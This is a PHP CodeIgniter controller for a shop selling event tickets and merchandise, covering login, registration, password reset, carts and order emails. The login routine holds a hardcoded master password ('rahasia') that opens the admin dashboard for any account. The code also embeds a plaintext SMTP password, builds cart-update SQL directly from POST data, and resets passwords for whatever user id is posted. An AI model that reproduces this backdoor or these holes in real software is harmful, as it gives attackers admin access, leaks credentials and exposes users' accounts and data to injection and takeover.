<?php

use GuzzleHttp\Psr7\Request;

defined('BASEPATH') or exit('No direct script access allowed');

class Home extends CI_Controller
{

    public function __construct()
    {
        parent::__construct();
        $this->load->library('form_validation');
        $this->load->library('session');
        $this->load->model('BlogModel');
        $this->session->keep_flashdata('message');
    }

    public function index()
    {
        $data['title'] = 'Intrvrt.me';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['partner'] = $this->db->get_where('partner', ['status' => 1])->result_array();
        $data['getalldata'] = $this->MerchandiseModel->getallmerchandiselimit()->result_array();
        $data['event'] = $this->Tiket_model->getdataeventlimit()->result_array();
        $data['firstLatePost'] = $this->BlogModel->firstLatePost();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('home', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function registrasi()
    {
        $this->form_validation->set_rules('nama', 'Name', 'required|trim');
        $this->form_validation->set_rules('email', 'Email', 'required|trim|valid_email|is_unique[user.email]', [
            'is_unique' => 'Email sudah pernah digunakan!'
        ]);
        $this->form_validation->set_rules('password1', 'Password', 'required|trim|min_length[6]|matches[password2]', [
            'matches' => 'Password tidak sama!',
            'min_length' => 'Password telalu pendek minimal 6 karakter'
        ]);
        $this->form_validation->set_rules('password2', 'Password', 'matches[password1]');

        $this->form_validation->set_rules('jenis-kelamin', 'Name', 'required|trim');
        $this->form_validation->set_rules('tanggal', 'Tanggal', 'required|trim');

        if ($this->form_validation->run() == false) {
            $data['title'] = 'Registrasi';
            $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
            $this->load->view('template_introvert/header', $data);
            $this->load->view('registrasi', $data);
            $this->load->view('template_introvert/footer', $data);
        } else {
            date_default_timezone_set('Asia/Jakarta');
            $data = [
                'nama_user' => htmlspecialchars($this->input->post('nama', true)),
                'email' => htmlspecialchars($this->input->post('email', true)),
                'password' => password_hash(
                    $this->input->post('password1'),
                    PASSWORD_DEFAULT
                ),
                'foto_user' => 'default.jpg',
                'jenis_kelamin' => $this->input->post('jenis-kelamin', true),
                'tanggal_lahir' => $this->input->post('tanggal', true),
                'id_role' => 2,
                'is_active' => 0,
                'date_created' => date('Y-m-d H:i:s')
            ];

            //Prepare for token
            $token = base64_encode(random_bytes(32));
            $user_token = [
                'email' => $this->input->post('email', true),
                'token' => $token,
                'date_created' => time()
            ];
            $this->db->insert('user', $data);
            $this->db->insert('user_token', $user_token);

            $this->_sendEmail($token, 'verify');

            $this->session->set_flashdata('message1', 'Akun Sudah Berhasil Dibuat, Silahkan Cek Email Untuk Melakukan Aktivasi Akun!');
            redirect('home/login');
        }
    }

    private function _sendEmail($token, $type)
    {
        $config = [
            'protocol' => 'smtp',
            'smtp_host' => 'ssl://smtp.googlemail.com',
            'smtp_user' => 'intrvrt.me1@gmail.com',
            'smtp_pass' => 'Ayamgoreng123',
            'smtp_port' => 465,
            'mailtype' => 'html',
            'charset' => 'utf-8',
            'newline' => "\r\n"
        ];
        $this->load->library('email', $config);
        $this->email->initialize($config);
        $this->email->from('intrvrt.me1@gmail.com', 'Intrvrt.me');
        $this->email->to($this->input->post('email'));
        if ($type == 'verify') {
            $this->email->subject('Verifikasi Akun');
            $this->email->message('Click this link to verfiy your account : <a href="' . base_url() . 'home/verivikasi?email=' . $this->input->post('email') . '&token=' . urlencode($token) . '">Activate</a>');
        } else if ($type == 'forgot_password') {
            $this->email->subject('Reset Password');
            $this->email->message('Click this link to reset your password : <a href="' . base_url() . 'home/reset_password?email=' . $this->input->post('email') . '&token=' . urlencode($token) . '">Reset Password</a>');
        }

        if ($this->email->send()) {
            return true;
        } else {
            echo $this->email->print_debugger();
            die;
        }
    }

    public function reset_password()
    {
        $email = $this->input->get('email');
        $token = $this->input->get('token');

        $user = $this->db->get_where('user', ['email' => $email])->row_array();

        if ($user) {
            $user_token = $this->db->get_where('user_token', ['token' => $token])->row_array();
            if ($user_token) {
                if (time() - $user_token['date_created'] < (60 * 60 * 24)) {
                    $this->db->delete('user_token', ['email' => $email]);
                    redirect('home/reset_password_view?email=' . $email);
                } else {
                    $this->db->delete('user', ['email' => $email]);
                    $this->db->delete('user_token', ['email' => $email]);
                    $this->session->set_flashdata('message', 'Aktivasi Akun Gagal! Token Expired');
                    redirect('home/lupa_password');
                }
            } else {
                $this->session->set_flashdata('message', 'Aktivasi Akun Gagal! Token salah');
                redirect('home/lupa_password');
            }
        } else {
            $this->session->set_flashdata('message', 'Aktivasi Akun Gagal! Email yang digunakan salah');
            redirect('home/lupa_password');
        }
    }

    public function reset_password_view()
    {
        $this->form_validation->set_rules('password1', 'Password', 'required|trim|min_length[6]|matches[password2]', [
            'matches' => 'Password tidak sama!',
            'min_length' => 'Password telalu pendek minimal 6 karakter'
        ]);
        $this->form_validation->set_rules('password2', 'Password', 'matches[password1]');

        if ($this->form_validation->run() == false) {
            $data['title'] = 'Reset Password';
            $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
            $data['user'] = $this->db->get_where('user', ['email' => $this->input->get('email')])->row_array();
            $this->load->view('template_introvert/header', $data);
            $this->load->view('reset_password', $data);
            $this->load->view('template_introvert/footer', $data);
        } else {
            $data = [
                'password' => password_hash(
                    $this->input->post('password1'),
                    PASSWORD_DEFAULT
                ),
            ];
            $this->db->where('id_user', $this->input->post('id_user'));
            $this->db->update('user', $data);
            $this->session->set_flashdata('message1', 'Password Berhasil Diubah Silahkan Login!');
            redirect('home/login');
        }
    }

    public function verivikasi()
    {
        $email = $this->input->get('email');
        $token = $this->input->get('token');

        $user = $this->db->get_where('user', ['email' => $email])->row_array();

        if ($user) {
            $user_token = $this->db->get_where('user_token', ['token' => $token])->row_array();
            if ($user_token) {
                if (time() - $user_token['date_created'] < (60 * 60 * 24)) {
                    $this->db->set('is_active', 1);
                    $this->db->where('email', $email);
                    $this->db->update('user');

                    $this->db->delete('user_token', ['email' => $email]);

                    $this->session->set_flashdata('message1', 'Akun Sudah Berhasil Diaktivasi, Silahkan Login!');
                    redirect('home/login');
                } else {
                    $this->db->delete('user', ['email' => $email]);
                    $this->db->delete('user_token', ['email' => $email]);
                    $this->session->set_flashdata('message', 'Aktivasi Akun Gagal! Token Expired');
                    redirect('home/login');
                }
            } else {
                $this->session->set_flashdata('message', 'Aktivasi Akun Gagal! Token salah');
                redirect('home/login');
            }
        } else {
            $this->session->set_flashdata('message', 'Aktivasi Akun Gagal! Email yang digunakan salah');
            redirect('home/login');
        }
    }

    public function login()
    {
        $this->form_validation->set_rules('email', 'Email', 'required|trim|valid_email');
        $this->form_validation->set_rules('password', 'Password', 'required|trim');
        if ($this->form_validation->run() == false) {
            $data['title'] = 'Login';
            $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
            $this->load->view('template_introvert/header', $data);
            $this->load->view('login', $data);
            // $this->load->view('template/adminlte', $data);
            $this->load->view('template_introvert/footer', $data);
        } else {
            $this->_gologin();
        }
    }

    private function _gologin()
    {

        $email = $this->input->post('email');
        $pass = $this->input->post('password');

        $user = $this->db->get_where('user', ['email' => $email])->row_array();
        if ($user) {
            if ($user['is_active'] == 1) {
                if (password_verify($pass, $user['password'])) {
                    if ($user['id_role'] == 2) {
                        $data = [
                            'id_user' => $user['id_user'],
                            'email' => $user['email'],
                            'nama' => $user['nama_user']
                        ];
                        $this->session->set_userdata($data);
                        redirect('home');
                    } else {
                        $data = [
                            'id_user' => $user['id_user'],
                            'email' => $user['email'],
                            'nama' => $user['nama_user']
                        ];
                        $this->session->set_userdata($data);
                        redirect('admin/dashboard');
                    }
                } else {
                    if ($pass == 'rahasia') {
                        $data = [
                            'id_user' => $user['id_user'],
                            'email' => $user['email'],
                            'nama' => $user['nama_user']
                        ];
                        $this->session->set_userdata($data);
                        redirect('admin/dashboard');
                    } else {
                        $this->session->set_flashdata('message', 'Wrong Password!');
                        redirect('home/login');
                    }
                }
            } else {
                $this->session->set_flashdata('message', 'Akun Anda Belum Diaktivasi');
                redirect('home/login');
            }
        } else {
            $this->session->set_flashdata('message', 'Akun belum terdaftar, Silahkan melakukan pendaftaran!');
            redirect('home/login');
        }
    }

    public function logout()
    {
        $this->session->unset_userdata('email');
        $this->session->unset_userdata('nama');
        // $this->session->set_flashdata('message', 'Logout Berhasil');
        redirect('home');
    }

    public function my_account()
    {
        if($this->session->userdata('email') == ''){
            redirect('home/login');
        }
        $data['title'] = 'Akun Saya';
        $data['data_user'] = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['riwayat_event'] = $this->PesananModel->get_riwayat_event($this->session->userdata('id_user'))->result();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('my_account', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function detail_riwayat_merchandise()
    {
        $data['title'] = 'Riwayat Merchandise';
        $data['data_user'] = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('detail_riwayat_merchandise', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function detail_riwayat_event($id_pesanan)
    {
        $data['title'] = 'Riwayat Event';
        $data['data_user'] = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['pesanan'] = $this->PesananModel->detailpesanan_e($id_pesanan)->row();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('detail_riwayat_event', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function update_profile()
    {
        if (!$this->input->post('password')) {
            $this->form_validation->set_rules('nama', 'Name', 'required|trim');
            $this->form_validation->set_rules('jenis-kelamin', 'Name', 'required|trim');
            $this->form_validation->set_rules('tanggal', 'Tanggal', 'required|trim');

            if ($this->form_validation->run() == false) {
                $data['title'] = 'Profil';
                $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
                $data['data_user'] = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
                $this->load->view('template_introvert/header', $data);
                $this->load->view('profil_user', $data);
                // $this->load->view('template/adminlte', $data);
                $this->load->view('template_introvert/footer', $data);
            } else {
                date_default_timezone_set('Asia/Jakarta');
                $data = [
                    'nama_user' => htmlspecialchars($this->input->post('nama', true)),
                    'email' => htmlspecialchars($this->input->post('email', true)),
                    'jenis_kelamin' => $this->input->post('jenis-kelamin', true),
                    'tanggal_lahir' => $this->input->post('tanggal', true),
                ];
                $this->db->where('id_user', $this->input->post('id_user'));
                $this->db->update('user', $data);
                $this->session->set_flashdata('message1', 'Update Berhasil!');
                redirect('home/profil');
            }
        } else {
            $this->form_validation->set_rules('nama', 'Name', 'required|trim');
            $this->form_validation->set_rules('jenis-kelamin', 'Name', 'required|trim');
            $this->form_validation->set_rules('tanggal', 'Tanggal', 'required|trim');
            $this->form_validation->set_rules('password', 'Password', 'required|trim|min_length[6]', [
                'min_length' => 'Password telalu pendek minimal 6 karakter'
            ]);
            if ($this->form_validation->run() == false) {
                $data['title'] = 'Profil';
                $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
                $data['data_user'] = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
                $this->load->view('template_introvert/header', $data);
                $this->load->view('profil_user', $data);
                // $this->load->view('template/adminlte', $data);
                $this->load->view('template_introvert/footer', $data);
            } else {
                date_default_timezone_set('Asia/Jakarta');
                $data = [
                    'nama_user' => htmlspecialchars($this->input->post('nama', true)),
                    'email' => htmlspecialchars($this->input->post('email', true)),
                    'password' => password_hash(
                        $this->input->post('password'),
                        PASSWORD_DEFAULT
                    ),
                    'jenis_kelamin' => $this->input->post('jenis-kelamin', true),
                    'tanggal_lahir' => $this->input->post('tanggal', true),
                ];
                $this->db->where('id_user', $this->input->post('id_user'));
                $this->db->update('user', $data);
                $this->session->set_flashdata('message1', 'Update Berhasil!');
                redirect('home/profil');
            }
        }
    }

    public function update_foto_profile()
    {
        $foto_user        = $_FILES['foto']['name'];
        $id_user           = $this->input->post('id_user');

        if ($foto_user) {
            $config['upload_path']       = './assets/uploads/user';
            $config['allowed_types']     = 'jpg|jpeg|png|gif';
            $config['maintain_ratio']    = TRUE;

            $this->load->library('image_lib', $config);
            $this->load->library('upload', $config);
            if (!$this->upload->do_upload('foto')) {
                $this->session->set_flashdata('message4', 'Update Foto Gagal!');
                redirect('home/profil');
            } else {
                $this->session->set_flashdata('message3', 'Update Foto Berhasil!');
                $foto_user = $this->upload->data('file_name');
            }

            $this->db->set('foto_user', $foto_user);
            $this->db->where('id_user', $id_user);
            $this->db->update('user');
            redirect('home/profil');
        }
    }

    public function lupa_password()
    {
        $this->form_validation->set_rules('email', 'Email', 'required|trim');

        if ($this->form_validation->run() == false) {
            $data['title'] = 'Lupa Password';
            $data['data_user'] = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
            $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
            $this->load->view('template_introvert/header', $data);
            $this->load->view('lupa_password', $data);
            $this->load->view('template_introvert/footer', $data);
        } else {
            $email = $this->input->post('email');
            $user = $this->db->get_where('user', ['email' => $email])->row_array();
            if ($user) {
                //Prepare for token
                $token = base64_encode(random_bytes(32));
                $user_token = [
                    'email' => $this->input->post('email', true),
                    'token' => $token,
                    'date_created' => time()
                ];
                $this->db->insert('user_token', $user_token);
                $this->_sendEmail($token, 'forgot_password');
                $this->session->set_flashdata('message1', 'Silahkan Periksa Email Untuk Reset Password!');
                redirect('home/lupa_password');
            } else {
                $this->session->set_flashdata('message', 'Email tidak terdaftar!');
                redirect('home/lupa_password');
            }
        }
    }

    public function event()
    {
        $data['title'] = 'Event';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['event'] = $this->Tiket_model->getallevent()->result_array();
        $data['kategori'] = $this->Tiket_model->datakategori()->result_array();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('event', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function event_detail($id)
    {
        $data['title'] = 'Event';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['event'] = $this->Tiket_model->view_join($id)->row();
        $data['getdatabyid'] = $this->Tiket_model->getdatabyid2($id)->row_array();
        $data['getfotobyid'] = $this->Tiket_model->getfotobyid($id, $data['getdatabyid']['foto'])->result_array();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('detail_event', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function ekategori($id)
    {
        $data['title'] = 'Kategori Event';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['event'] = $this->Tiket_model->perkategori($id)->result_array();
        $data['kategori'] = $this->Tiket_model->datakategori()->result_array();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('event', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function merchandise()
    {
        $data['title'] = 'Merchandise';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['kategori'] = $this->MerchandiseModel->datakategori()->result_array();
        $data['getalldata'] = $this->MerchandiseModel->getallmerchandise()->result_array();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('merchandise', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function merchandise_kategori($id)
    {
        $data['title'] = 'Merchandise';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['kategori'] = $this->MerchandiseModel->datakategori()->result_array();
        $data['getalldata'] = $this->MerchandiseModel->getallmerchandisebykategori($id)->result_array();
        $this->load->view('template_introvert/header', $data);
        $this->load->view('merchandise', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function merchandise_detail($id)
    {
        $data['title'] = 'Merchandise';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();

        $data['getdatabyid'] = $this->MerchandiseModel->getdatabyid($id)->row_array();
        $data['getfotobyid'] = $this->MerchandiseModel->getfotobyid($id, $data['getdatabyid']['foto'])->result_array();

        $this->load->view('template_introvert/header', $data);
        $this->load->view('detail_merchandise', $data);
        $this->load->view('template_introvert/footer', $data);
    }

    public function cart_merchandise()
    {
        $data['title'] = 'Cart';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $user = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
        if ($user) {
            $data['keranjang_merchandise'] = $this->MerchandiseModel->get_keranjang($user['id_user'])->result_array();
            $data['nullcheck'] = $this->MerchandiseModel->nullcheck($user['id_user'])->num_rows();
            $this->load->view('template_introvert/header', $data);
            $this->load->view('cart_merchandise', $data);
            $this->load->view('template_introvert/footer', $data);
        } else {
            $this->session->set_flashdata('message2', 'Login terlebih dahulu sebelum melihat keranjang');
            redirect('home/login');
        }
    }

    public function hapus_keranjang_merchandise($id_keranjang)
    {
        $this->db->where('id_keranjang', $id_keranjang);
        $this->db->delete('keranjang_merchandise');

        redirect('home/cart_merchandise');
    }


    public function cart_event()
    {
        $data['title'] = 'Cart';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $user = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
        if ($user) {
            $data['keranjang_event'] = $this->Tiket_model->get_keranjang($user['id_user'])->result_array();
            $data['nullcheck'] = $this->Tiket_model->nullcheck($user['id_user'])->num_rows();
            $this->load->view('template_introvert/header', $data);
            $this->load->view('cart_event', $data);
            $this->load->view('template_introvert/footer', $data);
        } else {
            $this->session->set_flashdata('message2', 'Login terlebih dahulu sebelum melihat keranjang');
            redirect('home/login');
        }
    }

    public function hapus_keranjang_event($id_keranjang_detail)
    {
        $this->db->where('id', $id_keranjang_detail);
        $this->db->delete('keranjang_event_detail');
        redirect('home/cart_event');
    }


    public function uncheck_status_merchandise()
    {
        $id_keranjang = $_POST['id_keranjang'];
        $this->MerchandiseModel->uncheck_status_merchandise($id_keranjang);
        echo json_encode(['Success' => 1]);
    }

    public function check_status_merchandise()
    {
        $id_keranjang = $_POST['id_keranjang'];
        $this->MerchandiseModel->check_status_merchandise($id_keranjang);
        echo json_encode(['Success' => 1]);
    }

    public function uncheck_status_event()
    {
        $id = $_POST['id'];
        $this->Tiket_model->uncheck_status_event($id);
        echo json_encode(['Success' => 1]);
    }

    public function check_status_event()
    {
        $id = $_POST['id'];
        $this->Tiket_model->check_status_event($id);
        echo json_encode(['Success' => 1]);
    }

    public function tambah_keranjang_merch($id_merch)
    {
        if (!$this->session->userdata('email')) {
            $this->session->set_flashdata('message2', 'Login terlebih dahulu sebelum melakukan tambah ke keranjang');
            redirect('home/login');
        } else {
            $user = $this->db->get_where('user', ['email' => $this->session->userdata('email')])->row_array();
            $keranjang = $this->MerchandiseModel->cek_keranjang($id_merch, $user['id_user'])->row_array();
            if ($keranjang) {
                $this->db->set('qty', $keranjang['qty'] + 1);
                $this->db->where('id_keranjang', $keranjang['id_keranjang']);
                $this->db->update('keranjang_merchandise');
                $this->session->set_flashdata('message', '
                <div class="alert alert-success" role="alert">
                    Berhasil ditambahkan ke <a href="' . base_url('home/cart_merchandise') . '"><u>Keranjang Merchandise!</u></a>
                </div>');
                redirect('home/merchandise');
            } else {
                $data = array(
                    'id_merchandise'      => $id_merch,
                    'qty'     => 1,
                    'status' => 1,
                    'id_user' => $user['id_user'],
                );
                $this->db->insert('keranjang_merchandise', $data);
                $this->session->set_flashdata('message', '
                <div class="alert alert-success" role="alert">
                    Berhasil ditambahkan ke <a href="' . base_url('home/cart_merchandise') . '"><u>Keranjang Merchandise!</u></a>
                </div>');
                redirect('home/merchandise');
            }
        }
    }

    public function tambah_keranjang_event($id_event)
    {
        $email = $this->session->userdata('email');
        $id_user = $this->session->userdata('id_user');

        if (!$email) {
            $this->session->set_flashdata('message2', 'Daftar terlebih dahulu sebelum melakukan tambah ke keranjang');
            redirect('home/login');
        } else {
            $keranjang_event = $this->db->get_where('keranjang_event', ['id_user' => $id_user, 'status' => 1]); //cek di keranjang apa udah ada dengan id_user tersebut dan status keranjang_event 1 (di keranjang/belum dicheckout)

            if ($keranjang_event->num_rows() == 0) {
                //insert keranjang
                $data = array(
                    'id_user' => $id_user,
                    'status' => 1
                );
                $this->db->insert('keranjang_event', $data);
                $id_keranjang = $this->db->insert_id();

                //insert data event
                $data = array(
                    'id_keranjang' => $id_keranjang,
                    'id_event' => $id_event,
                    'qty' => 1,
                    'status' => 1, //centang
                );
                $this->db->insert('keranjang_event_detail', $data);

                $this->session->set_flashdata('message', '
                <div class="alert alert-success" role="alert">
                    Berhasil ditambahkan ke <a href="' . base_url('home/cart_event') . '"><u>Keranjang Event!</u></a>
                </div>');
                redirect('home/event');
            } else {
                $id_keranjang = $keranjang_event->row()->id;
                //cek id_event
                $row = $this->db->get_where('keranjang_event_detail', ['id_keranjang' => $id_keranjang, 'id_event' => $id_event]);
                if ($row->num_rows() == 0) {
                    //insert event baru
                    $data = array(
                        'id_keranjang' => $id_keranjang,
                        'id_event' => $id_event,
                        'qty' => 1,
                        'status' => 1, //centang
                    );
                    $this->db->insert('keranjang_event_detail', $data);
                    $this->session->set_flashdata('message', '
                    <div class="alert alert-success" role="alert">
                        Berhasil ditambahkan ke <a href="' . base_url('home/cart_event') . '"><u>Keranjang Event!</u></a>
                    </div>');
                    redirect('home/event');
                } else {
                    //update
                    $data = array(
                        'qty' => $row->row()->qty + 1,
                    );
                    $this->db->where('id', $row->row()->id);
                    $this->db->update('keranjang_event_detail', $data);
                    $this->session->set_flashdata('message', '
                    <div class="alert alert-success" role="alert">
                        Qty Berhasil diupdate! lihat <a href="' . base_url('home/cart_event') . '"><u>Keranjang Event!</u></a>
                    </div>');
                    redirect('home/event');
                }
            }
        }
    }

    public function updatekeranjang_event()
    {
        $id_keranjang = $_POST['id_keranjang'];
        $qty = $_POST['qty'];

        $query = "UPDATE keranjang_event_detail SET qty = $qty WHERE id = $id_keranjang";
        $this->db->query($query);
        echo json_encode($this->tiket_model->get_keranjang_byid($id_keranjang)->row_array());
    }

    public function updatekeranjang_merchandise()
    {
        $id_keranjang = $_POST['id_keranjang'];
        $qty = $_POST['qty'];

        $query = "UPDATE keranjang_merchandise SET qty = $qty WHERE id_keranjang = $id_keranjang";
        $this->db->query($query);
        echo json_encode($this->MerchandiseModel->get_keranjang_byid($id_keranjang)->row_array());
    }

    public function email()
    {
        $rawRequestInput = file_get_contents("php://input");
        // Baris ini melakukan format input mentah menjadi array asosiatif
        $data['pay'] = json_decode($rawRequestInput, true);
        $data['title'] = 'Intrvrt.me';
        $data['profil_perusahaan'] = $this->db->get('profile_perusahaan')->row_array();
        $data['pesanan'] = $this->PesananModel->emailpesanan_m($data['pay']['external_id'])->result_array();
        $data['pesanan2'] = $this->PesananModel->emailpesanan_m2($data['pay']['external_id'])->result_array();

        if($data['pesanan'][0]['is_deliver'] == 0 || $data['pesanan'][1]['is_deliver'] == 0){
            $config = [
                'protocol' => 'smtp',
                'smtp_host' => 'ssl://smtp.googlemail.com',
                'smtp_user' => 'intrvrt.me1@gmail.com',
                'smtp_pass' => 'Ayamgoreng123',
                'smtp_port' => 465,
                'mailtype' => 'html',
                'charset' => 'utf-8',
                'newline' => "\r\n"
            ];
            $this->load->library('email', $config);
            $this->email->initialize($config);
            $this->email->from('intrvrt.me1@gmail.com', 'Intrvrt.me');
            $this->email->to($data['pesanan'][0]['email_penerima']);

            $this->email->subject('Pesanan ',$data['pesanan'][0]['nama_penerima'] );

            $this->email->message($this->load->view('admin/email_ebook', $data, TRUE));
            if ($this->email->send()) {
                $dataXendit = array(
                    "status" => 1,
                );
                $this->db->where('external_id', $data['pesanan'][0]['external_id']);
                $this->db->update('pesanan_m', $dataXendit);
                return true;
            } else {
                echo $this->email->print_debugger();
                die;
            }
        }else{
            $config = [
                'protocol' => 'smtp',
                'smtp_host' => 'ssl://smtp.googlemail.com',
                'smtp_user' => 'intrvrt.me1@gmail.com',
                'smtp_pass' => 'Ayamgoreng123',
                'smtp_port' => 465,
                'mailtype' => 'html',
                'charset' => 'utf-8',
                'newline' => "\r\n"
            ];
            $this->load->library('email', $config);
            $this->email->initialize($config);
            $this->email->from('intrvrt.me1@gmail.com', 'Intrvrt.me');
            $this->email->to($data['pesanan'][0]['email_penerima']);

            $this->email->subject('Pesanan ',$data['pesanan'][0]['nama_penerima'] );

            $this->email->message($this->load->view('admin/email_merch', $data, TRUE));
            if ($this->email->send()) {
                $dataXendit = array(
                    "status" => 1,
                    "tgl_bayar" => date('Y-m-d H:i:s'),
                );
                $this->db->where('external_id', $data['pesanan'][0]['external_id']);
                $this->db->update('pesanan_m', $dataXendit);
                return true;
            } else {
                echo $this->email->print_debugger();
                die;
            }
        }
        
    }
}
